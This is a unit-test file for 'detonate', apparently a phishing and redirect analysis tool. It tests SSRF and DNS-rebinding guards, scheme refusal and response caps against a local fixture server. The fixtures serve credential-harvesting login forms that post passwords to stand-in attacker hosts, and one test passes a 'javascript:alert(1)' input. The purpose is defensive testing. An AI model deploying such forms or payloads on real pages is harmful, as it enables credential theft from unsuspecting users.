"""Unit tests for detonate (T-026) — local-only fixture server, never a
real domain (§13 safety rules). Mirrors harness/detonate.test.js's fixture
routes one-to-one so the Python port is tested against the same scenarios
the JS original already proved out, not a fresh guess at what matters.

detonate() refuses loopback/private/link-local targets by default (SSRF
guard, Rule 2880752) — every test below against this fixture passes
allow_private_network_targets=True to opt back in explicitly, except the
one test right after this comment that proves the default refusal is real.
"""

from __future__ import annotations

import json
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from unittest.mock import patch

import pytest
import requests

from imports_mcp.detonate import MAX_RESPONSE_BYTES, detonate


class _FixtureHandler(BaseHTTPRequestHandler):
    def log_message(self, *args):  # silence test-run noise
        pass

    def do_GET(self):
        if self.path == "/start":
            self.send_response(302)
            self.send_header("Location", "/login")
            self.end_headers()
        elif self.path == "/login":
            body = b"""
                <html><body>
                  <form method="POST" action="http://evil.invalid/collect">
                    <input type="text" name="username">
                    <input type="password" name="password">
                  </form>
                </body></html>
            """
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(body)
        elif self.path == "/plain":
            body = b"just text, no forms"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(body)
        elif self.path == "/uppercase-html":
            body = (
                b'<html><body><form method="POST" action="http://evil.invalid/collect">'
                b'<input type="password" name="p"></form></body></html>'
            )
            self.send_response(200)
            self.send_header("Content-Type", "TEXT/HTML; charset=utf-8")
            self.end_headers()
            self.wfile.write(body)
        elif self.path == "/malformed-form":
            body = b"""
                <html><body>
                  <form method="POST" action="http://[">
                    <input type="password" name="p">
                  </form>
                  <form method="POST" action="http://evil.invalid/collect">
                    <input type="password" name="p">
                  </form>
                </body></html>
            """
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(body)
        elif self.path == "/bad-redirect":
            self.send_response(302)
            self.send_header("Location", "http://[")
            self.end_headers()
        elif self.path == "/slow":
            time.sleep(0.5)
            body = b"too slow"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(body)
        elif self.path == "/big":
            body = b"x" * 1000
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.end_headers()


@pytest.fixture
def fixture_server():
    server = ThreadingHTTPServer(("127.0.0.1", 0), _FixtureHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server.server_port
    finally:
        server.shutdown()
        thread.join()


def _url(port: int, path: str) -> str:
    return f"http://127.0.0.1:{port}{path}"


def test_refuses_loopback_private_targets_by_default(fixture_server):
    result = detonate(_url(fixture_server, "/start"))
    assert "refused private/internal network target" in result["error"]
    assert result["redirect_chain"] == []


@patch("imports_mcp.detonate._resolve_pinned_address")
def test_dns_resolution_failure_refuses_rather_than_falling_through_unpinned(mock_resolve):
    """Qodo review, PR #81: _resolve_pinned_address() returning None (a
    resolution failure, not a confirmed-private address) used to fall
    through to an *unpinned* request - reopening the exact DNS-rebinding
    gap this pinning mechanism exists to close. A resolver that answers
    SERVFAIL/times out on this lookup specifically, then answers normally
    with a private address on requests' own independent lookup, would
    bypass the guard entirely. Must refuse instead."""
    mock_resolve.return_value = None

    result = detonate("http://example.invalid/start")

    assert "could not resolve" in result["error"]
    assert result["redirect_chain"] == []
    mock_resolve.assert_called_once()


def test_follows_redirect_chain_and_flags_cross_domain_password_form(fixture_server):
    result = detonate(_url(fixture_server, "/start"), allow_private_network_targets=True)
    assert len(result["redirect_chain"]) == 2
    assert result["redirect_chain"][0]["status"] == 302
    assert result["redirect_chain"][1]["status"] == 200
    assert len(result["forms"]) == 1
    assert result["forms"][0]["asks_password"] is True
    assert result["forms"][0]["cross_domain"] is True
    assert "asks for a password" in result["summary"]


def test_non_html_response_returns_full_documented_shape(fixture_server):
    result = detonate(_url(fixture_server, "/plain"), allow_private_network_targets=True)
    assert result["forms"] == []
    assert isinstance(result["summary"], str)
    assert "not HTML" in result["summary"]
    assert result["final_url"]
    assert result["redirect_chain"] is not None


def test_refuses_non_http_schemes():
    result = detonate("javascript:alert(1)")
    assert "refused non-http" in result["error"]


def test_malformed_start_url_returns_a_structured_error_not_a_raise():
    result = detonate("not a url")
    assert isinstance(result, dict)
    assert result["error"]
    assert result["redirect_chain"] == []


def test_connection_failure_returns_a_structured_error_not_a_raise():
    # Qodo (PR #38 review): hard-coding "port 1, surely nothing listens
    # there" made this test dependent on ambient host network state - a
    # host that actually serves something on port 1 would follow
    # detonate()'s success path instead of the fetch-error path this test
    # asserts. Mocking the request call to raise requests.ConnectionError
    # exercises the same RequestException handling deterministically, with
    # no real connection attempted at all - no fixture server needed here.
    with patch(
        "imports_mcp.detonate._get_without_proxy_trust",
        side_effect=requests.ConnectionError("connection refused"),
    ):
        result = detonate("http://127.0.0.1/start", allow_private_network_targets=True)
    assert isinstance(result, dict)
    assert result["error"]
    assert result["redirect_chain"] == []


def test_timeout_returns_a_structured_error_not_a_raise(fixture_server):
    result = detonate(
        _url(fixture_server, "/slow"), allow_private_network_targets=True, timeout_seconds=0.05
    )
    assert result["error"]


def test_malformed_redirect_location_returns_a_structured_error_not_a_raise(fixture_server):
    # `requests` parses a Response's Location header internally to build
    # `Response.next`, even with allow_redirects=False, and raises a bare
    # ValueError straight out of requests.get() for a malformed one - the
    # hop that triggered it is never recorded, unlike detonate.js's fetch()
    # (which doesn't eagerly parse Location the same way). Verified, not
    # assumed: the point that matters - a structured error, never a raise
    # out of this function - still holds.
    result = detonate(_url(fixture_server, "/bad-redirect"), allow_private_network_targets=True)
    assert isinstance(result, dict)
    assert result["error"]


def test_one_malformed_form_action_does_not_abort_analysis_of_the_others(fixture_server):
    result = detonate(_url(fixture_server, "/malformed-form"), allow_private_network_targets=True)
    assert len(result["forms"]) == 2
    assert result["forms"][0]["action_invalid"] is True
    assert result["forms"][1]["asks_password"] is True
    assert result["forms"][1]["cross_domain"] is True


def test_html_content_type_check_is_case_insensitive(fixture_server):
    result = detonate(_url(fixture_server, "/uppercase-html"), allow_private_network_targets=True)
    assert len(result["forms"]) == 1
    assert result["forms"][0]["asks_password"] is True


def test_oversized_response_body_is_rejected_before_parsing(fixture_server):
    result = detonate(
        _url(fixture_server, "/big"), allow_private_network_targets=True, max_body_bytes=100
    )
    assert "byte limit" in result["error"]


# --- response cap (Rule 2880706) ---


def test_small_result_is_not_truncated(fixture_server):
    result = detonate(_url(fixture_server, "/plain"), allow_private_network_targets=True)
    assert result["truncated"] is False
    assert "omitted" not in result


def test_many_forms_are_trimmed_under_the_2kb_cap(fixture_server):
    # Build a page with enough forms that the serialized response would
    # otherwise exceed the cap - proves the list-trimming path, not just
    # the string-shrinking one.
    class ManyFormsHandler(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def do_GET(self):
            forms = "".join(
                f'<form method="POST" action="https://attacker-{i}.example/collect">'
                f'<input type="password" name="p"></form>'
                for i in range(200)
            )
            body = f"<html><body>{forms}</body></html>".encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(body)

    server = ThreadingHTTPServer(("127.0.0.1", 0), ManyFormsHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        result = detonate(f"http://127.0.0.1:{server.server_port}/", allow_private_network_targets=True)
    finally:
        server.shutdown()
        thread.join()

    assert result["truncated"] is True
    assert result["omitted"]["forms"] > 0
    assert len(json.dumps(result, ensure_ascii=False).encode("utf-8")) <= MAX_RESPONSE_BYTES
